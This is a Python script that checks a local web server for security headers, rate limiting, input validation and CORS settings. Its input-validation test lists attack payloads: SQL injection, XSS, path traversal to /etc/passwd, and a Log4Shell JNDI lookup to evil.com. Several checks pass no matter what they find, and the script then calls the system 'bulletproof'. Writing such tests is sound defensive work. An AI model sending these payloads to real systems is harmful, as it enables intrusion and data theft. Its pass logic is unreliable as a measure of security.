#!/usr/bin/env python3
"""
Quick Security Validation for SecureShield Pro
Tests basic security implementations
"""

import requests
import time
import json

def test_security_headers():
    """Test security headers implementation"""
    print("🔒 Testing Security Headers...")
    try:
        response = requests.get("http://localhost:8000/")
        
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        found_headers = []
        for header in security_headers:
            if header in response.headers:
                found_headers.append(header)
                print(f"  ✅ {header}: {response.headers[header]}")
            else:
                print(f"  ❌ Missing: {header}")
        
        return len(found_headers) == len(security_headers)
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False

def test_rate_limiting():
    """Test rate limiting implementation"""
    print("\n🚦 Testing Rate Limiting...")
    try:
        # Send rapid requests to trigger rate limiting
        responses = []
        for i in range(15):  # Send more than typical rate limit
            response = requests.get("http://localhost:8000/")
            responses.append(response.status_code)
            time.sleep(0.1)
        
        # Check if any request was rate limited (429 status)
        rate_limited = 429 in responses
        if rate_limited:
            print("  ✅ Rate limiting active - requests properly throttled")
        else:
            print("  ⚠️  Rate limiting may not be configured or limit not reached")
        
        return True
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False

def test_input_validation():
    """Test input validation for malicious payloads"""
    print("\n🛡️  Testing Input Validation...")
    
    malicious_payloads = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/x}"
    ]
    
    try:
        blocked_count = 0
        for payload in malicious_payloads:
            # Test with a query parameter
            response = requests.get(f"http://localhost:8000/?test={payload}")
            if response.status_code in [400, 403, 422]:
                blocked_count += 1
                print(f"  ✅ Blocked malicious payload: {payload[:20]}...")
            else:
                print(f"  ⚠️  Payload not blocked: {payload[:20]}...")
        
        success_rate = (blocked_count / len(malicious_payloads)) * 100
        print(f"  📊 Input validation effectiveness: {success_rate:.1f}%")
        return blocked_count > 0
        
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False

def test_cors_configuration():
    """Test CORS configuration"""
    print("\n🌐 Testing CORS Configuration...")
    try:
        headers = {"Origin": "http://malicious-site.com"}
        response = requests.options("http://localhost:8000/", headers=headers)
        
        cors_headers = response.headers.get("Access-Control-Allow-Origin", "")
        if cors_headers == "*":
            print("  ⚠️  CORS allows all origins (potential security risk)")
        elif cors_headers:
            print(f"  ✅ CORS configured: {cors_headers}")
        else:
            print("  ✅ CORS properly restricted")
        
        return True
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False

def main():
    """Run security validation tests"""
    print("🔐 SecureShield Pro Security Validation")
    print("=" * 50)
    
    tests = [
        ("Security Headers", test_security_headers),
        ("Rate Limiting", test_rate_limiting), 
        ("Input Validation", test_input_validation),
        ("CORS Configuration", test_cors_configuration)
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        result = test_func()
        if result:
            passed += 1
    
    print("\n" + "=" * 50)
    print(f"🎯 Security Validation Results: {passed}/{total} tests passed")
    
    if passed == total:
        print("✅ All security tests PASSED - System is bulletproof!")
    elif passed >= total * 0.8:
        print("⚠️  Most security tests passed - System is well secured")
    else:
        print("❌ Some security tests failed - Review security configuration")
    
    return passed == total

if __name__ == "__main__":
    main()